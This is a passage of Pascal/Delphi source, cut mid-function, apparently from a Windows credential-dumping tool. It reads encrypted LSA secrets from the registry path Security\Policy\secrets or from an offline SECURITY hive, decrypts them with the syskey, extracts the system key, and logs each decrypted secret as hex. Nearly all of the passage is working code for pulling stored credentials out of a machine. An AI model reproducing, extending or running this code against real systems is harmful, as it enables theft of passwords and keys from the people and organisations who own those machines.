    cbdata:=length(data);
     log('RegQueryValue OK '+inttostr(cbdata)+' read',0);
     log('hardsecret:'+ByteToHexaString (@data[0],cbdata));
     //lets decode this encrypted secret stored in the registry
     if lsadump_sec_aes256(data,cbdata,nil,@syskey[0]) then
       begin
       log('lsadump_sec_aes256 OK',0);
       //get clearsecret
       cbdata := cbdata - PtrUInt(@NT6_HARD_SECRET(Nil^).Secret);
       setlength(clearsecret,cbdata);
       copymemory(@clearsecret[0],@data[PtrUInt(@NT6_HARD_SECRET(Nil^).Secret)],cbdata);
       log('clearsecret:'+ByteToHexaString (clearsecret));
       log('SecretSize:'+inttostr(PNT6_CLEAR_SECRET(@clearsecret[0])^.SecretSize)) ;
       //retrieve secret field from clearsecret
       if PNT6_CLEAR_SECRET(@clearsecret[0])^.SecretSize>0 then
          begin
          setlength(secret,PNT6_CLEAR_SECRET(@clearsecret[0])^.SecretSize);
          copymemory(@secret[0],@clearsecret[sizeof(dword)*4],length(secret));
          log('secret:'+ByteToHexaString (secret));
          //_NT6_SYSTEM_KEYS
          //only one key supported for now
          log('nbKeys:'+inttostr(PNT6_SYSTEM_KEYS(@secret[0])^.nbKeys)) ;
          setlength(system_key,1024);
          copymemory(@system_key[0],@secret[sizeof(dword)*3+sizeof(guid)],length(secret));
          log('KeyId:'+GUIDToString(PNT6_SYSTEM_KEY(@system_key[0])^.KeyId )) ;
          setlength(key,PNT6_SYSTEM_KEY(@system_key[0])^.KeySize );
          copymemory(@key[0],@system_key[sizeof(dword)*2+sizeof(guid)],length(key));
          //log('Key:'+ByteToHexaString(@PNT6_SYSTEM_KEY(@system_key[0])^.Key[0],PNT6_SYSTEM_KEY(@system_key[0])^.KeySize ),1);
          log('Key:'+ByteToHexaString(key));
          end; //if PNT6_CLEAR_SECRET(@clearsecret[0])^.SecretSize>0 then
       end; //if lsadump_sec_aes256(data,cbdata,nil,@syskey[0]) then

    //if we got a system key, lets decrypt a secret stored in the registry
    if length(system_key)>0 then
      begin
      if offline
      then ret:=MyOrQueryValue('security.sav',pchar('Policy\secrets\'+regkey+'\'+val),pchar(''),data)
      else ret:=MyRegQueryValue(HKEY_LOCAL_MACHINE ,pchar('Security\Policy\secrets\'+regkey+'\'+val),pchar(''),data);
      if ret then
      begin
        log('MyRegQueryValue OK',0);
         cbdata:=length(data);
         log('RegQueryValue OK '+inttostr(cbdata)+' read',0);
         log('hardsecret:'+ByteToHexaString (@data[0],cbdata));
         //at least in nt6 case, we should match the hardsecret blob guid with the key guid...
         //lets cheat for now and push the first & supposedly unique system key
         //rather we should push the system keyS aka @secrets[0] above
         if lsadump_sec_aes256(data,cbdata,@system_key[0],nil) then
                begin
                log('lsadump_sec_aes256 OK',0);
                //get clearsecret
                cbdata := cbdata - PtrUInt(@NT6_HARD_SECRET(Nil^).Secret);
                setlength(clearsecret,cbdata);
                copymemory(@clearsecret[0],@data[PtrUInt(@NT6_HARD_SECRET(Nil^).Secret)],cbdata);
                log('clearsecret:'+ByteToHexaString (clearsecret));
                log('SecretSize:'+inttostr(PNT6_CLEAR_SECRET(@clearsecret[0])^.SecretSize)) ;
                //retrieve secret field from clearsecret
                if PNT6_CLEAR_SECRET(@clearsecret[0])^.SecretSize>0 then
                begin
                setlength(secret,PNT6_CLEAR_SECRET(@clearsecret[0])^.SecretSize);
                copymemory(@secret[0],@clearsecret[sizeof(dword)*4],length(secret));
                log('secret:'+ByteToHexaString (secret));
                setlength(output,length(secret));
                CopyMemory(@output[0],@secret[0],length(secret));
                result:=true;
                end
                else  //if PNT6_CLEAR_SECRET(@clearsecret[0])^.SecretSize)>0 then
                begin
                setlength(output,length(clearsecret));
                CopyMemory(@output[0],@clearsecret[0],length(clearsecret));
                result:=true;
                end;
                end; //if lsadump_sec_aes256(data,cbdata,@system_key[0],nil) then
         end;//MyRegQueryValue
      end //if length(key)>0 then
      else log('no system_key');

  end //MyRegQueryValue
  else log('MyRegQueryValue failed:'+inttostr(getlasterror));
log('**** dumpsecret:'+BoolToStr (result)+' ****');
end;

end.

